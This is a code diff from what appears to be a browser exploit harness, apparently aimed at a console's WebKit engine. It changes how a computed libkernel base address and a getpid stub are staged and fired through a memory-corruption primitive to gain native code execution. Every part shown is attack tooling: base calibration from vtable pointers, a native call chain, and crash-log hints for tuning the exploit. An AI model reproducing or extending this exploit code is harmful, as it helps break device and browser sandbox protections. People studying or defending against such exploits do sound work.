@@ -44,7 +44,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830g";
+const BUILD_ID = "rw-20250830h";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -478,7 +478,7 @@ function runManualTest(testId) {
                 mark("LK-SKIP", "enter libkernel base hex, then Force lk (0 reads)");
                 return;
             }
-            runForceLkAndGetpid(lk);
+            runForceLkOnly(lk);
             return;
         }
         if (testId === "scan-iat") {
@@ -1803,7 +1803,7 @@ function runTryCalPtrs() {
     lkQuiet = true;
     mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + cands.length
         + " " + c.label + " code=" + c.ptr + " → base=" + lkBase);
-    mark("LK-HINT", "hex has module base — tap Force lk (auto-fires getpid)");
+    mark("LK-HINT", "hex has module base — tap Force lk (0 reads), then Arm → Fire");
     lkQuiet = false;
     if (outEl) {
         outEl.textContent = lines.join("\n");
@@ -2139,63 +2139,21 @@ function getpidStubAddr(lk, off) {
     return { stub: lk.add32(stubOff), stubOff };
 }
 
-/** Force lk → arm → fire in one sync block (chain_poops timing). */
-function runForceLkAndGetpid(lk) {
-    if (busy || !ready || !window.p || !nativeAllowed) return;
-    const p = window.p;
-    const off = loadEffectiveOff();
+/** Force lk — 0 reads, session only. Arm + Fire are separate taps. */
+function runForceLkOnly(lk) {
+    if (busy || !ready) return;
     const lkWarn = validateLkBase(lk);
     if (lkWarn) mark("LK-WARN", lkWarn);
-
-    busy = true;
-    setUi();
-    nativeQuiet = true;
-    lkQuiet = true;
-    retained.length = 0;
-    pointers.length = 0;
-
-    let pid = -1;
-    let errMsg = null;
-    try {
-        saveLibkernelSession(lk, null, { forced: true });
-        mark("LK-OK", "forced " + lk + " (0 reads)");
-        if (!nativePrep) ensureNativePrep(p, off);
-        const { stub, stubOff } = getpidStubAddr(lk, off);
-        stageGetpid(p, nativePrep, lk, off);
-        mark("NATIVE-ARMED", "stub=" + stub + " (lk+" + stubOff.toString(16) + ")");
-        crashLog.append("NATIVE-FIRE lk=" + lk + " stub=" + stub, "NATIVE-FIRE");
-        crashLog.flushSync();
-        pid = fireGetpid(p, nativePrep);
-    } catch (err) {
-        errMsg = err.message || String(err);
-    }
-
-    nativeQuiet = false;
-    lkQuiet = false;
-    nativeStaged = false;
-    if (pid > 0) {
-        mark("NATIVE-OK", "getpid=" + pid + " build=" + BUILD_ID);
-        state("getpid OK pid=" + pid, "ok");
-        crashLog.append("NATIVE-OK getpid=" + pid, "NATIVE-OK");
-        crashLog.flushSync();
-    } else {
-        const msg = errMsg || "getpid=" + pid;
-        mark("NATIVE-FAIL", msg + " build=" + BUILD_ID);
-        if (/getpid=0/.test(msg) || pid === 0)
-            mark("LK-HINT", "wrong lk base — reload, Load cal ptr, Force lk again");
-        else
-            mark("LK-HINT", "tab died = bad stub/lk crash (not JS OOM) — try next cal vtable entry");
-        state("getpid failed", "bad");
-        crashLog.append("NATIVE-FAIL " + msg, "NATIVE-FAIL");
-        crashLog.flushSync();
-    }
+    const off = loadEffectiveOff();
+    const { stub, stubOff } = getpidStubAddr(lk, off);
+    saveLibkernelSession(lk, null, { forced: true });
+    mark("LK-OK", "forced " + lk + " (0 reads) stub=" + stub + " lk+" + stubOff.toString(16));
+    state("lk forced — tap Arm getpid", "warn");
     renderOut();
-    busy = false;
-    setUi();
-}
-
-function tryAutoArmGetpid(lk) {
-    runForceLkAndGetpid(lk);
+    try {
+        crashLog.append("LK-OK forced " + lk + " stub=" + stub, "LK-OK");
+        crashLog.flushSync();
+    } catch (_) { }
 }
 
 function runArmGetpid() {
@@ -2506,9 +2464,7 @@ async function runStart() {
         } catch (prepErr) {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
-        const forcedLk = loadForcedLibkernel();
-        if (forcedLk) tryAutoArmGetpid(forcedLk);
-        mark("HINT", "Force lk → Fire getpid — no Verify pivot / scans (OOM)");
+        mark("HINT", "Load cal ptr → Force lk (0 reads) → Arm → Fire getpid");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
